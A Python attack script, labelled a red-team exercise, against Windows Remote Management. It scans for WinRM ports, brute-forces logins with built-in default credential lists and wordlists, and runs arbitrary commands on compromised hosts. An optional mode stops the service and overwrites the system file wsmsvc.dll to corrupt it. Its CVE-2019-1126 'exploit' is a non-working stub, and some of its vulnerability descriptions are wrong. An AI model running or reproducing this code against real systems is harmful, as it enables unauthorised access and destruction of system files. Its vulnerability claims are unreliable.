#!/usr/bin/env python3
"""
WinRM Attack Script for Windows - Red Team Exercise
"""

import argparse
import os
import subprocess
import sys
import socket
import requests
import re
import time
import uuid
import base64
import xml.etree.ElementTree as ET
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, Style, init

# Initialize colorama
init()

def print_banner():
    """Print script banner"""
    banner = f"""
{Fore.RED}╔═══════════════════════════════════════════════════════════════╗
║                 WINRM WINDOWS ATTACK SCRIPT                    ║
║                    RED TEAM EXERCISE                           ║
╚═══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
    """
    print(banner)

def check_dependencies():
    """Check if required dependencies are installed and install if missing"""
    print(f"{Fore.YELLOW}[*] Checking dependencies...{Style.RESET_ALL}")
    
    required_packages = [
        "requests",
        "colorama",
        "python-nmap",
        "pywinrm",
        "requests_ntlm",
        "impacket"
    ]
    
    missing_packages = []
    for package in required_packages:
        try:
            __import__(package.split('[')[0])  # Handle extras like 'package[extra]'
        except ImportError:
            missing_packages.append(package)
    
    if missing_packages:
        print(f"{Fore.YELLOW}[*] Installing missing dependencies: {', '.join(missing_packages)}{Style.RESET_ALL}")
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install"] + missing_packages)
            print(f"{Fore.GREEN}[+] Dependencies installed successfully{Style.RESET_ALL}")
        except subprocess.CalledProcessError:
            print(f"{Fore.RED}[!] Failed to install dependencies. Please install manually: pip install {' '.join(missing_packages)}{Style.RESET_ALL}")
            sys.exit(1)
    else:
        print(f"{Fore.GREEN}[+] All dependencies are already installed{Style.RESET_ALL}")
    
    # Check for system tools
    system_tools = ["nmap"]
    missing_tools = []
    
    for tool in system_tools:
        if subprocess.call(["which", tool], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) != 0:
            missing_tools.append(tool)
    
    if missing_tools:
        print(f"{Fore.YELLOW}[*] Installing missing system tools: {', '.join(missing_tools)}{Style.RESET_ALL}")
        try:
            subprocess.check_call(["apt-get", "update", "-qq"])
            subprocess.check_call(["apt-get", "install", "-y"] + missing_tools)
            print(f"{Fore.GREEN}[+] System tools installed successfully{Style.RESET_ALL}")
        except subprocess.CalledProcessError:
            print(f"{Fore.RED}[!] Failed to install system tools. Please install manually: sudo apt-get install {' '.join(missing_tools)}{Style.RESET_ALL}")
            sys.exit(1)

def port_scan(target, ports=None):
    """Scan target for open ports"""
    print(f"{Fore.YELLOW}[*] Scanning target for open ports...{Style.RESET_ALL}")
    
    import nmap
    scanner = nmap.PortScanner()
    
    if not ports:
        ports = "5985,5986,47001"  # Default WinRM ports
    
    scanner.scan(target, ports, arguments='-sV --script=banner')
    
    open_ports = []
    for host in scanner.all_hosts():
        for proto in scanner[host].all_protocols():
            for port in scanner[host][proto].keys():
                service = scanner[host][proto][port]
                if service['state'] == 'open':
                    print(f"{Fore.GREEN}[+] Found open port {port}/{proto}: {service['product']} {service.get('version', '')}{Style.RESET_ALL}")
                    open_ports.append((port, proto, service))
    
    return open_ports

def winrm_auth_test(target, port, username=None, password=None, domain=None, wordlist=None):
    """Test WinRM authentication with provided credentials or try common ones"""
    print(f"{Fore.YELLOW}[*] Testing WinRM authentication...{Style.RESET_ALL}")
    
    import winrm
    
    protocol = "http" if port == 5985 else "https"
    
    credentials = []
    
    # If credentials provided, use them
    if username and password:
        credentials.append((username, password))
    
    # If wordlist provided, add those credentials
    if wordlist and os.path.exists(wordlist):
        print(f"{Fore.YELLOW}[*] Loading credentials from wordlist: {wordlist}{Style.RESET_ALL}")
        with open(wordlist, 'r') as f:
            for line in f:
                line = line.strip()
                if ':' in line:
                    u, p = line.split(':', 1)
                    credentials.append((u, p))
    
    # If no credentials provided, try some common ones
    if not credentials:
        common_users = ["administrator", "admin", "user", "guest", "service", "sysadmin", "root", "test"]
        common_passwords = ["password", "Password123!", "admin", "administrator", "123456", "P@ssw0rd", "Welcome1", ""]
        
        print(f"{Fore.YELLOW}[*] No credentials provided, trying common combinations...{Style.RESET_ALL}")
        
        for u in common_users:
            for p in common_passwords:
                credentials.append((u, p))
    
    print(f"{Fore.YELLOW}[*] Testing {len(credentials)} credential pairs...{Style.RESET_ALL}")
    
    valid_creds = []
    for username, password in credentials:
        try:
            print(f"{Fore.CYAN}[*] Trying {username}:{password}{Style.RESET_ALL}", end="", flush=True)
            
            # Set up session options based on domain
            session_options = {}
            if domain:
                session_options['server'] = target
                session_options['port'] = port
                session_options['username'] = f"{domain}\\{username}"
                session_options['password'] = password
                session_options['transport'] = 'ntlm'
            else:
                session_options['endpoint'] = f"{protocol}://{target}:{port}/wsman"
                session_options['username'] = username
                session_options['password'] = password
            
            # Try to establish WinRM connection
            session = winrm.Session(**session_options)
            # Run a simple command to test
            result = session.run_cmd("hostname")
            
            if result.status_code == 0:
                print(f"\r{Fore.GREEN}[+] Valid credentials found: {username}:{password}{Style.RESET_ALL}")
                valid_creds.append((username, password))
                print(f"{Fore.GREEN}[+] Command output: {result.std_out.decode().strip()}{Style.RESET_ALL}")
            else:
                print(f"\r{Fore.RED}[-] Authentication failed for {username}:{password} (Status: {result.status_code}){Style.RESET_ALL}")
                
        except Exception as e:
            error_msg = str(e)
            if "unauthorized" in error_msg.lower() or "access is denied" in error_msg.lower():
                print(f"\r{Fore.RED}[-] Authentication failed for {username}:{password}{Style.RESET_ALL}")
            elif "unreachable" in error_msg.lower() or "timed out" in error_msg.lower():
                print(f"\r{Fore.RED}[!] WinRM service unreachable. Verify the service is running.{Style.RESET_ALL}")
                break
            elif "ssl" in error_msg.lower() or "certificate" in error_msg.lower():
                print(f"\r{Fore.YELLOW}[*] SSL certificate issue with {username}:{password}. Try with HTTPS and proper certificate handling.{Style.RESET_ALL}")
            else:
                print(f"\r{Fore.RED}[-] Error with {username}:{password}: {e}{Style.RESET_ALL}")
    
    return valid_creds

def brute_force_winrm(target, port, username_list=None, password_list=None, domain=None):
    """Brute force WinRM authentication using username and password lists"""
    
    if not username_list or not os.path.exists(username_list):
        print(f"{Fore.RED}[!] Username list not provided or not found{Style.RESET_ALL}")
        return []
    
    if not password_list or not os.path.exists(password_list):
        print(f"{Fore.RED}[!] Password list not provided or not found{Style.RESET_ALL}")
        return []
    
    print(f"{Fore.YELLOW}[*] Starting WinRM brute force attack...{Style.RESET_ALL}")
    
    # Load usernames and passwords
    usernames = []
    with open(username_list, 'r') as f:
        usernames = [line.strip() for line in f if line.strip()]
    
    passwords = []
    with open(password_list, 'r') as f:
        passwords = [line.strip() for line in f if line.strip()]
    
    print(f"{Fore.YELLOW}[*] Loaded {len(usernames)} usernames and {len(passwords)} passwords{Style.RESET_ALL}")
    
    # Prepare credentials list
    credentials = []
    for username in usernames:
        for password in passwords:
            credentials.append((username, password))
    
    valid_creds = []
    protocol = "http" if port == 5985 else "https"
    
    # Function to test a single credential pair
    def test_credential(cred):
        username, password = cred
        try:
            import winrm
            
            # Set up session options based on domain
            session_options = {}
            if domain:
                session_options['server'] = target
                session_options['port'] = port
                session_options['username'] = f"{domain}\\{username}"
                session_options['password'] = password
                session_options['transport'] = 'ntlm'
            else:
                session_options['endpoint'] = f"{protocol}://{target}:{port}/wsman"
                session_options['username'] = username
                session_options['password'] = password
            
            # Try to establish WinRM connection
            session = winrm.Session(**session_options)
            # Run a simple command to test
            result = session.run_cmd("hostname")
            
            if result.status_code == 0:
                print(f"{Fore.GREEN}[+] Valid credentials found: {username}:{password}{Style.RESET_ALL}")
                return (username, password)
            
        except Exception:
            pass
        
        return None
    
    # Use ThreadPoolExecutor for parallel testing
    print(f"{Fore.YELLOW}[*] Testing {len(credentials)} credential pairs with multithreading...{Style.RESET_ALL}")
    
    with ThreadPoolExecutor(max_workers=10) as executor:
        results = list(executor.map(test_credential, credentials))
    
    # Filter out None results
    valid_creds = [cred for cred in results if cred]
    
    print(f"{Fore.GREEN}[+] Found {len(valid_creds)} valid credential pairs{Style.RESET_ALL}")
    
    return valid_creds

def execute_command(target, port, username, password, command, domain=None):
    """Execute a command on the target using WinRM"""
    print(f"{Fore.YELLOW}[*] Executing command: {command}{Style.RESET_ALL}")
    
    import winrm
    
    protocol = "http" if port == 5985 else "https"
    
    try:
        # Set up session options based on domain
        session_options = {}
        if domain:
            session_options['server'] = target
            session_options['port'] = port
            session_options['username'] = f"{domain}\\{username}"
            session_options['password'] = password
            session_options['transport'] = 'ntlm'
        else:
            session_options['endpoint'] = f"{protocol}://{target}:{port}/wsman"
            session_options['username'] = username
            session_options['password'] = password
        
        # Try to establish WinRM connection
        session = winrm.Session(**session_options)
        result = session.run_cmd(command)
        
        if result.status_code == 0:
            print(f"{Fore.GREEN}[+] Command executed successfully{Style.RESET_ALL}")
            print(f"{Fore.CYAN}--- Command output ---{Style.RESET_ALL}")
            print(result.std_out.decode())
            print(f"{Fore.CYAN}--------------------{Style.RESET_ALL}")
            return True
        else:
            print(f"{Fore.RED}[!] Command execution failed with status code {result.status_code}{Style.RESET_ALL}")
            print(f"{Fore.RED}--- Error output ---{Style.RESET_ALL}")
            print(result.std_err.decode())
            print(f"{Fore.RED}-------------------{Style.RESET_ALL}")
            return False
            
    except Exception as e:
        print(f"{Fore.RED}[!] Failed to execute command: {e}{Style.RESET_ALL}")
        return False

def exploit_cve_2019_1126(target, port):
    """Attempt to exploit CVE-2019-1126 (WinRM NTLM Reflection)"""
    print(f"{Fore.YELLOW}[*] Attempting to exploit CVE-2019-1126 (WinRM NTLM Reflection)...{Style.RESET_ALL}")
    
    try:
        from impacket import ntlm
        from impacket.smbconnection import SMBConnection
        
        # This is a simplified demonstration of the attack concept
        # A full implementation would require more complex NTLM message manipulation
        
        # Step 1: Connect to the target WinRM service
        smb_conn = SMBConnection(target, target)
        
        # Step 2: Attempt to trigger NTLM authentication
        try:
            smb_conn.login('', '')
        except Exception:
            pass
        
        # Step 3: Get the challenge
        challenge = smb_conn.getSMBServer().get_challenge()
        
        print(f"{Fore.YELLOW}[*] Got NTLM challenge: {challenge.hex()}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] This is a simplified demonstration of the vulnerability concept.{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] A full exploit would require implementing NTLM message reflection.{Style.RESET_ALL}")
        
        # In a real exploit, you would:
        # 1. Capture the NTLM challenge from the server
        # 2. Reflect it back to the server in a crafted request
        # 3. Capture the response and use it to authenticate
        
        return False  # Return false as this is just a demonstration
        
    except Exception as e:
        print(f"{Fore.RED}[!] Failed to exploit CVE-2019-1126: {e}{Style.RESET_ALL}")
        return False

def disable_winrm_service(target, port, username, password, domain=None):
    """Attempt to disable the WinRM service"""
    print(f"{Fore.YELLOW}[*] Attempting to disable WinRM service...{Style.RESET_ALL}")
    
    # Commands to disable WinRM service
    disable_commands = [
        # Disable WinRM through PowerShell
        "powershell -Command \"Stop-Service WinRM -Force\"",
        "powershell -Command \"Set-Service WinRM -StartupType Disabled\"",
        
        # Disable WinRM through SC command
        "sc stop WinRM",
        "sc config WinRM start= disabled",
        
        # Backup and corrupt WinRM binary (highly disruptive)
        "powershell -Command \"Copy-Item -Path \\\"C:\\Windows\\System32\\wsmsvc.dll\\\" -Destination \\\"C:\\Windows\\System32\\wsmsvc.dll.bak\\\" -Force\"",
        "powershell -Command \"$null = [System.IO.File]::WriteAllText(\\\"C:\\Windows\\System32\\wsmsvc.dll\\\", \\\"CORRUPTED\\\")\"",
        
        # Disable WinRM through registry
        "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WSMAN /v ServiceStartupType /t REG_DWORD /d 4 /f",
        
        # Add firewall rule to block WinRM ports
        "netsh advfirewall firewall add rule name=\"Block WinRM\" dir=in action=block protocol=TCP localport=5985,5986"
    ]
    
    success_count = 0
    for command in disable_commands:
        try:
            print(f"{Fore.YELLOW}[*] Running command: {command}{Style.RESET_ALL}")
            if execute_command(target, port, username, password, command, domain):
                success_count += 1
        except Exception as e:
            print(f"{Fore.RED}[!] Error executing command: {e}{Style.RESET_ALL}")
    
    if success_count > 0:
        print(f"{Fore.GREEN}[+] {success_count}/{len(disable_commands)} commands executed successfully to disable WinRM{Style.RESET_ALL}")
        return True
    else:
        print(f"{Fore.RED}[!] Failed to disable WinRM service{Style.RESET_ALL}")
        return False

def check_winrm_vulnerabilities(target, port):
    """Check for known WinRM vulnerabilities"""
    print(f"{Fore.YELLOW}[*] Checking for known WinRM vulnerabilities...{Style.RESET_ALL}")
    
    vulnerabilities = [
        {
            "cve": "CVE-2019-1126",
            "name": "WinRM NTLM Reflection",
            "description": "Windows Remote Management (WinRM) allows an attacker to relay NTLM authentication to other services.",
            "exploitable": True,
            "exploit_function": exploit_cve_2019_1126
        },
        {
            "cve": "CVE-2020-1380",
            "name": "WinRM Memory Corruption",
            "description": "A memory corruption vulnerability exists in Windows Remote Management when it improperly handles objects in memory.",
            "exploitable": False
        },
        {
            "cve": "CVE-2021-38647",
            "name": "OMIGOD Vulnerability",
            "description": "Remote code execution vulnerability in Windows WinRM when configured with OMI.",
            "exploitable": False
        }
    ]
    
    print(f"{Fore.YELLOW}[*] Checking for {len(vulnerabilities)} known vulnerabilities...{Style.RESET_ALL}")
    
    for vuln in vulnerabilities:
        print(f"{Fore.YELLOW}[*] Checking for {vuln['cve']} - {vuln['name']}...{Style.RESET_ALL}")
        print(f"{Fore.CYAN}    Description: {vuln['description']}{Style.RESET_ALL}")
        
        if vuln.get("exploitable", False) and "exploit_function" in vuln:
            print(f"{Fore.YELLOW}[*] Attempting to exploit {vuln['cve']}...{Style.RESET_ALL}")
            result = vuln["exploit_function"](target, port)
            if result:
                print(f"{Fore.GREEN}[+] Successfully exploited {vuln['cve']}!{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}[-] Failed to exploit {vuln['cve']}{Style.RESET_ALL}")
        else:
            print(f"{Fore.YELLOW}[*] No public exploit available for {vuln['cve']}{Style.RESET_ALL}")
    
    return vulnerabilities

def main():
    """Main function"""
    parser = argparse.ArgumentParser(description="WinRM Attack Script for Windows - Red Team Exercise")
    parser.add_argument("target", help="Target IP address or hostname")
    parser.add_argument("-p", "--port", type=int, help="Target port (default: 5985)", default=5985)
    parser.add_argument("-u", "--username", help="Username for authentication attempts")
    parser.add_argument("-P", "--password", help="Password for authentication attempts")
    parser.add_argument("-d", "--domain", help="Domain for authentication attempts")
    parser.add_argument("-U", "--userlist", help="Path to file containing usernames for brute force")
    parser.add_argument("-W", "--wordlist", help="Path to file containing passwords for brute force")
    parser.add_argument("-c", "--command", help="Command to execute on successful authentication")
    parser.add_argument("--disable", action="store_true", help="Attempt to disable the WinRM service if possible")
    parser.add_argument("--check-only", action="store_true", help="Only check for vulnerabilities, don't attempt exploitation")
    args = parser.parse_args()
    
    print_banner()
    check_dependencies()
    
    # Initial port scan
    open_ports = port_scan(args.target, str(args.port))
    
    if not open_ports:
        print(f"{Fore.RED}[!] No open ports found on target {args.target}:{args.port}. Exiting.{Style.RESET_ALL}")
        sys.exit(1)
    
    # Check for vulnerabilities
    vulnerabilities = check_winrm_vulnerabilities(args.target, args.port)
    
    if args.check_only:
        print(f"{Fore.YELLOW}[*] Vulnerability check completed. Exiting as requested.{Style.RESET_ALL}")
        sys.exit(0)
    
    # Attempt authentication
    valid_creds = []
    
    # If credentials provided, test them
    if args.username and args.password:
        print(f"{Fore.YELLOW}[*] Testing provided credentials...{Style.RESET_ALL}")
        valid_creds = winrm_auth_test(args.target, args.port, args.username, args.password, args.domain)
    
    # If userlist and wordlist provided, do brute force
    elif args.userlist and args.wordlist:
        print(f"{Fore.YELLOW}[*] Starting brute force with provided lists...{Style.RESET_ALL}")
        valid_creds = brute_force_winrm(args.target, args.port, args.userlist, args.wordlist, args.domain)
    
    # Otherwise, try common credentials
    else:
        print(f"{Fore.YELLOW}[*] No credentials provided, trying common combinations...{Style.RESET_ALL}")
        valid_creds = winrm_auth_test(args.target, args.port)
    
    # If we have valid credentials
    if valid_creds:
        print(f"{Fore.GREEN}[+] Authentication successful with {len(valid_creds)} credential pairs{Style.RESET_ALL}")
        username, password = valid_creds[0]  # Use the first valid credential pair
        
        # Execute command if provided
        if args.command:
            execute_command(args.target, args.port, username, password, args.command, args.domain)
        
        # Attempt to disable the service if requested
        if args.disable:
            disable_winrm_service(args.target, args.port, username, password, args.domain)
    else:
        print(f"{Fore.RED}[!] No valid credentials found{Style.RESET_ALL}")
    
    # Summary
    print(f"\n{Fore.CYAN}=== Attack Summary ==={Style.RESET_ALL}")
    print(f"{Fore.CYAN}Target: {args.target}:{args.port}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}Found {len(vulnerabilities)} potential vulnerabilities{Style.RESET_ALL}")
    print(f"{Fore.CYAN}Found {len(valid_creds)} valid credential pairs{Style.RESET_ALL}")
    
    if valid_creds:
        print(f"{Fore.GREEN}[+] Valid credentials found:{Style.RESET_ALL}")
        for i, (username, password) in enumerate(valid_creds, 1):
            print(f"{Fore.GREEN}  {i}. {username}:{password}{Style.RESET_ALL}")
    
    if args.disable and valid_creds:
        print(f"{Fore.YELLOW}[*] Attempted to disable WinRM service{Style.RESET_ALL}")

if __name__ == "__main__":
    main()
